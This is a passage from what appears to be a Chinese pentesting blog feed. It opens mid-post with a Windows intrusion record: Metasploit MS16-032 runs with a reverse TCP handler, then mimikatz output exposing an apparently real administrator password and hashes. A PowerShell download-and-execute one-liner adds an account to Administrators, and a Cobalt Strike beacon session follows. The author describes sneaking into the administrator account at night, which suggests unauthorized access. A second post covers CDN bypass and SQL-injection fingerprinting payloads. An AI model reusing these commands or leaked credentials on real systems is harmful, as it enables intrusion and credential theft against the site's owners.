class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use  exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</span><br><span class="line">[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">[*] Started reverse TCP handler on 164.155.95.55:4444 </span><br><span class="line">[+] Compressed size: 1016</span><br><span class="line">[*] Writing payload file, C:\WINDOWS\TEMP\EnCngJ.ps1...</span><br><span class="line">[*] Compressing script contents...</span><br><span class="line">[+] Compressed size: 3564</span><br><span class="line">[*] Executing exploit script...</span><br><span class="line">[-] Exploit failed [user-interrupt]: Rex::TimeoutError Operation timed out.</span><br><span class="line">[+] Deleted C:\WINDOWS\TEMP\EnCngJ.ps1</span><br><span class="line">[-] run: Interrupted</span><br></pre></td></tr></table></figure><p>最后连接超时，百度一下原因发现。改模块需要目标系统具有powershell，而03的系统肯定是没有powershell的，但是问题来了为什么exe文件就可以提权，msf就不可以？两者的原理都是一样的，无非是形式不一样。</p><p>既然能够运行exp.exe，查看一下进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"> 5012  5372  notepad.exe             x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\notepad.exe</span><br><span class="line"> 5060  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5096  5288  notepad.exe             x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\notepad.exe</span><br><span class="line"> 5224  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5240  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5288  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5372  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5640  5644  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5672  4532  powershell.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\System32\windowspowershell\v1.0\powershell.exe</span><br><span class="line"> 6032  4532  powershell.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\System32\windowspowershell\v1.0\powershell.exe</span><br></pre></td></tr></table></figure><p>发现有powershell.exe。</p><p>最后直接连接3389，找到我们上传的迷你卡姿抓取密码，这里为了方便直接倒入到文件中，然后使用蚁剑下载到本地，拿到管理员账号密码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x86) #19041 Sep 18 2020 19:18:00</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https:<span class="comment">//pingcastle.com / https://mysmartlogon.com ***/</span></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::logonpasswords</span></span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">78368</span> (<span class="number">00000000</span>:<span class="number">00013220</span>)</span><br><span class="line">Session           : Service <span class="keyword">from</span> <span class="number">0</span></span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : RENHAI</span><br><span class="line">Logon Server      : RENHAI</span><br><span class="line">Logon Time        : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">20</span> </span><br><span class="line">SID               : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2928085508</span><span class="number">-3031473165</span><span class="number">-2762439012</span><span class="number">-500</span></span><br><span class="line">msv :</span><br><span class="line"> [<span class="number">00000002</span>] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : RENHAI</span><br><span class="line"> * LM       : d7b9834aa4c07e3bd8265b84d6256f93</span><br><span class="line"> * NTLM     : <span class="number">2</span>a40e70e764833f30c1c804f5709dba2</span><br><span class="line"> * SHA1     : aa34ec6af75a3813a158c3e95a475602f25b5a34</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : RENHAI</span><br><span class="line"> * Password : <span class="number">168</span>renhai</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : RENHAI</span><br><span class="line"> * Password : <span class="number">168</span>renhai</span><br></pre></td></tr></table></figure><p>接下来就等着晚上上线管理员了。</p><p>然后我们接着看一下msf使用ms16这个洞报错的原因，首先目标系统是肯定有ps的。再一次启动msf查看报错信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 164.155.95.55:4444 </span><br><span class="line">[+] Compressed size: 1016</span><br><span class="line">[*] Writing payload file, C:\DOCUME~1\good\LOCALS~1\Temp\1\VcDqmVnyed.ps1...</span><br><span class="line">[*] Compressing script contents...</span><br><span class="line">[+] Compressed size: 3596</span><br><span class="line">[*] Executing exploit script...</span><br><span class="line">[-] Exploit failed [user-interrupt]: Rex::TimeoutError Operation timed out.</span><br><span class="line">[-] run: Interrupted</span><br></pre></td></tr></table></figure><p>可以看到ps文件存在于<code>C:\DOCUME~1\good\LOCALS~1\Temp\1\VcDqmVnyed.ps1..</code>。我们到目标机器下面查看一下。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/37091F23-13E7-4DBF-895B-A4E4F598F4CC.png" alt="37091F23-13E7-4DBF-895B-A4E4F598F4CC"></p><p>可以看到目标系统上传了ps文件。我们直接使用ps执行ps脚本，发现报红而且闪退。大概这就是msf不能正常使用的原因吧。管理员权限不能使用ps，接着我们晚上偷摸的登录管理员用户，这时候就是system权限，然后调用ps。运行对应的脚本发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News\Invoke-MS16-032.ps1 檔案無法載入，因為這個系</span><br><span class="line">統上已停用指令碼執行。如需詳細資訊，請參閱 &quot;get-help about_signing&quot;。</span><br><span class="line">位於 行:1 字元:55</span><br><span class="line">+ D:\S_JCIN\WebSite\OutWeb\L_CT\News\Invoke-MS16-032.ps1 &lt;&lt;&lt;&lt;</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [], PSSecurityException</span><br><span class="line">    + FullyQualifiedErrorId : RuntimeException</span><br></pre></td></tr></table></figure><p>这是由于powershell的默认执行权限为<code>Restricted：脚本不能运行（默认设置）</code>。</p><p>查看一下当前powershell的默认执行权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Documents and Settings\Administrator&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><p>设置一下权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Documents and Settings\Administrator&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br><span class="line">PS C:\Documents and Settings\Administrator&gt; Set-ExecutionPolicy Unrestricted</span><br><span class="line"></span><br><span class="line">執行原則變更</span><br><span class="line">執行原則有助於防範您不信任的指令碼。如果變更執行原則，可能會使您接觸到</span><br><span class="line">about_Execution_Policies 說明主題中所述的安全性風險。您要變更執行原則嗎?</span><br><span class="line">[Y] 是(Y)  [N] 否(N)  [S] 暫停(S)  [?] 說明 (預設值為 &quot;Y&quot;): y</span><br><span class="line">PS C:\Documents and Settings\Administrator&gt; Get-ExecutionPolicy</span><br><span class="line">Unrestricted</span><br><span class="line">PS C:\Documents and Settings\Administrator&gt;</span><br></pre></td></tr></table></figure><p>这时候可以运行powershell脚本。</p><p>然后在管理员用户下运行cs马，反弹一个shell这时候就是system权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; sleep 0</span><br><span class="line">[*] Tasked beacon to become interactive</span><br><span class="line">[+] host called home, sent: 16 bytes</span><br><span class="line">beacon&gt; shell whoami</span><br><span class="line">[*] Tasked beacon to run: whoami</span><br><span class="line">[+] host called home, sent: 37 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">renhai\administrator</span><br></pre></td></tr></table></figure><h5 id="ps提权"><a href="#ps提权" class="headerlink" title="ps提权"></a>ps提权</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Documents and Settings\good&gt; powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https</span><br><span class="line">:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Ridter&#x2F;Pentest&#x2F;master&#x2F;powershell&#x2F;MyShell&#x2F;Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application</span><br><span class="line"> cmd.exe -commandline &#39;&#x2F;c net localgroup administrators gust &#x2F;add&#39;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 8</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">[?] Done, got 2 thread handle(s)!</span><br><span class="line"></span><br><span class="line">[?] Thread handle list:</span><br><span class="line">1604</span><br><span class="line">2424</span><br><span class="line"></span><br><span class="line">[*] Sniffing out privileged impersonation token..</span><br><span class="line"></span><br><span class="line">[?] Trying thread handle: 1604</span><br><span class="line">[?] Thread belongs to: svchost</span><br><span class="line">[+] Thread suspended</span><br><span class="line">[&gt;] Wiping current impersonation token</span><br><span class="line">[&gt;] Building SYSTEM impersonation token</span><br><span class="line">[?] Success, open SYSTEM token handle: 2420</span><br><span class="line">[+] Resuming thread..</span><br><span class="line"></span><br><span class="line">[*] Sniffing out SYSTEM shell..</span><br><span class="line"></span><br><span class="line">[&gt;] Duplicating SYSTEM token</span><br><span class="line">[&gt;] Starting token race</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">PS C:\Documents and Settings\good&gt; net localgroup administrators</span><br><span class="line">別名     administrators</span><br><span class="line">註解     Administrators 可以完全不受限制地存取電腦&#x2F;網域</span><br><span class="line"></span><br><span class="line">成員</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">banli$</span><br><span class="line">good</span><br><span class="line">Guest</span><br><span class="line">gust</span><br><span class="line">IUSR_TELNET</span><br><span class="line">TelNet</span><br><span class="line">命令執行成功。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL注入漏洞手注练习&quot;&gt;&lt;a href=&quot;#SQL注入漏洞手注练习&quot; class=&quot;headerlink&quot; title=&quot;SQL注入漏洞手注练习&quot;&gt;&lt;/a&gt;SQL注入漏洞手注练习&lt;/h1&gt;&lt;h2 id=&quot;Exp1&quot;&gt;&lt;a href=&quot;#Exp1&quot; class=&quot;</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>一个网站的渗透思路</title>
    <link href="http://s1eady.top/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/"/>
    <id>http://s1eady.top/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</id>
    <published>2020-10-23T13:21:43.000Z</published>
    <updated>2020-11-23T02:48:47.965Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一个网站的渗透思路"><a href="#一个网站的渗透思路" class="headerlink" title="一个网站的渗透思路"></a>一个网站的渗透思路</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>信息收集网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.shodan.io&#x2F;</span><br></pre></td></tr></table></figure><h5 id="判断网站是否存在cdn"><a href="#判断网站是否存在cdn" class="headerlink" title="判断网站是否存在cdn"></a>判断网站是否存在cdn</h5><ul><li><p>什么是cdn？</p><p>CDN的全称是Content Delivery Network，即内容分发网络。其目的是通过在现有的internet中增加一层新的网络架构，将网站的内容发布到最接近用户的网络边缘，使用户可以就近取得所需的内容，提高用户访问网站的响应速度。</p><p>具体流程为: 用户在自己的浏览器中输入要访问的网站的域名，浏览器向本地DNS请求对该域名的解析，本地DNS将请求发到网站的主DNS，主DNS根据一系列的策略确定当时最适当的CDN节点，并将解析的结果（IP地址）发给用户，用户向给定的CDN节点请求相应网站的内容。</p></li><li><p>为什么要绕过cdn？</p><p>由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p></li><li><p>判断是否有cdn的方式</p><ul><li><p>Nslookup命令–查看是否返回多个IP，如果返回多个IP则表示存在CDN，否则可能不存在CDN。</p><p>可以看到有多个IP。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nslookup jd.com</span><br><span class="line">Server:114.114.114.114</span><br><span class="line">Address:114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:jd.com</span><br><span class="line">Address: 111.13.149.108</span><br><span class="line">Name:jd.com</span><br><span class="line">Address: 120.52.148.118</span><br><span class="line">Name:jd.com</span><br><span class="line">Address: 118.193.98.63</span><br></pre></td></tr></table></figure></li><li><p>使用在线网站查看–如果有多个IP则存在CDN，如果只有一个IP则不存在CDN</p><p>常见网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爱站:     https:&#x2F;&#x2F;ping.aizhan.com&#x2F;</span><br><span class="line">站长之家:  http:&#x2F;&#x2F;ping.chinaz.com&#x2F;</span><br></pre></td></tr></table></figure></li><li><p>使用工具直接查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ipip.net&#x2F;ip.html</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="绕过CDN的方式"><a href="#绕过CDN的方式" class="headerlink" title="绕过CDN的方式"></a>绕过CDN的方式</h5><ul><li><p>查找子域名</p><p>因为CDN架设需要钱，所以有的站点只给主域名架上CDN，而子域名一般不架设CDN。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.oneforall 查找子域名</span><br><span class="line">2、Google hacker 查找子域名</span><br><span class="line">3、site:baidu.com -www</span><br></pre></td></tr></table></figure></li><li><p>让服务器主动给我们发送邮箱，邮箱系统很多都在内部，没有经过解析，可以在邮件源码里面找到服务的真实的</p></li><li><p>历史DNS记录</p><p>查询ip与域名绑定历史记录，会发现使用cdn之前的目标ip。</p><p>使用网站查询之前绑定的域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ip138.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnsdb.io&#x2F;zh-cn&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;x.threatbook.cn&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;sitereport.netcraft.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;viewdns.info&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.17ce.com&#x2F;</span><br></pre></td></tr></table></figure></li><li><p>利用网站漏洞</p><p>phpinfo敏感信息泄漏等等，如果存在web漏洞让服务器主动向我们请求链接，我们可以获取目标站点的真实ip。</p><p>可以尝试反弹shell到我们的主机。</p></li><li><p>cert证书查询</p><p>转化成十进制,使用fofa搜索。</p><p>fofa语法–<code>cert=&quot;十进制&quot;</code></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111235353259.png" alt="image-20201111235353259"></p></li><li><p>在国外ping–网站在国外没有CDN</p><p>使用国外的网站ping</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;en&#x2F;ping.php</span><br></pre></td></tr></table></figure></li><li><p>绕过之后开始渗透</p><p>把真实的ip与目标域名在hosts文件中绑定。</p><p>或者直接访问目标的ip而不是访问域名。</p></li></ul><h5 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h5><ul><li><p>使用burp抓包、放包，在返回包中可以看到使用的系统、脚本语言、服务类型以及waf类型等等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;gb2312</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Server: Microsoft-IIS&#x2F;8.5</span><br><span class="line">X-Powered-By: WAF&#x2F;2.0</span><br><span class="line">Date: Mon, 21 Sep 2020 12:02:33 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 9173</span><br></pre></td></tr></table></figure></li><li><p>使用谷歌插件–Wappalyzer 查看网站的基本信息，比如web服务、脚本语言等等。</p></li><li><p>判断数据库类型</p><p>数据库本身的特性</p><ul><li>access数据库，数据库文件后缀为.mdb，一般配合的脚本语言为asp。为小型数据库。</li><li>SQL Server数据库，数据库文件后缀为.mdf，一般配合的脚本语言为asp。端口号为1433。</li><li>mysql数据库，数据库后缀文件为,sql，一般配合的脚本语言为php，端口号为3306。</li><li>Oracle数据库，端口号为1521。</li></ul><p>sql注入判断数据库类型</p><ul><li><p>特有的函数</p><ul><li><p>通过使用查看数据库版本的函数，比如mysql的version()、@@version函数</p></li><li><p>substring和substr</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在mssql、mysql中可以调用substring。oracle则只可调用substr</span><br></pre></td></tr></table></figure></li><li><p>其他的一些函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sql server: @@pack_received @@rowcount</span><br><span class="line">mysql:connection_id() last_insert_id() row_count()</span><br><span class="line">orcale:bitand(1,1)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>对字符串的处理方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sql server ：id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; --</span><br><span class="line">mssql:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39;</span><br><span class="line">mysql:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; ， &#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br><span class="line">oracle:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;a&#39;||&#39;b&#39; ，&#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br><span class="line">postgresql :id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;a&#39;||&#39;b&#39; ,&#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br></pre></td></tr></table></figure></li><li><p>特殊符号以及注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">“&#x2F;*”是MySQL中的注释符，返回错误说明该注入点不是MySQL</span><br><span class="line">“--”是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。</span><br><span class="line">“;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库</span><br></pre></td></tr></table></figure></li><li><p>根据返回的报错类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ORACLE</span><br><span class="line">ORA-01756:quoted string not properly terminated</span><br><span class="line">ORA-00933:SQLcommand not properly ended</span><br><span class="line">MS-SQL</span><br><span class="line">Msg 170,level 15, State 1,Line 1</span><br><span class="line">Line 1:Incorrect syntax near ‘foo</span><br><span class="line">Msg 105,level 15,state 1,Line 1</span><br><span class="line">Unclose quotation mark before the character string ‘foo</span><br><span class="line">MYSQL</span><br><span class="line">you have an error in your SQL syntax,check the manual that corresponds to you mysql server version for the right stntax to use near ‘’foo’ at line x</span><br></pre></td></tr></table></figure></li><li><p>各个数据库特有的表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、mssql数据库</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">2、access数据库</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from msysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">3、mysql数据库(mysql版本在5.0以上)</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1</span><br><span class="line">4、oracle数据库</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><p>dirsearch、dirmap、dirb、御剑扫描工具。</p><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>namp、Masscan、msf</p><h5 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="子域名信息收集"></a>子域名信息收集</h5><ul><li><p>oneforall、知道创宇实验室ksubdomain</p></li><li><p>谷歌hacker语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com -www</span><br></pre></td></tr></table></figure></li></ul><h5 id="判断网站CMS类型"><a href="#判断网站CMS类型" class="headerlink" title="判断网站CMS类型"></a>判断网站CMS类型</h5><ul><li><p>cms特有的文件路径</p><p>比如WordPress的常用路径为wp-admin等等。</p></li><li><p>robots.txt文件中会列出一些禁止爬的目录。</p></li><li><p>查看版权信息</p><ul><li>网页的最底部可能会有版权信息。</li><li>网页前台的源代码中可能会有注释的版权信息。</li></ul></li></ul><h5 id="常见的cms扫描工具"><a href="#常见的cms扫描工具" class="headerlink" title="常见的cms扫描工具"></a>常见的cms扫描工具</h5><p>WordPress的专用扫描工具，wpscan。</p><p>CMSmap可以扫描WordPress，Joomla和Drupal。</p><p>判断出CMS之后可以搜索以往的cms漏洞，或者找到源码审计一下。</p><h5 id="操作系统的判断"><a href="#操作系统的判断" class="headerlink" title="操作系统的判断"></a>操作系统的判断</h5><ul><li><p>nmap 参数-O表示扫描操作系统信息</p></li><li><p>ping命令 </p><p>TTL起始值:</p><p>Windows xp 128 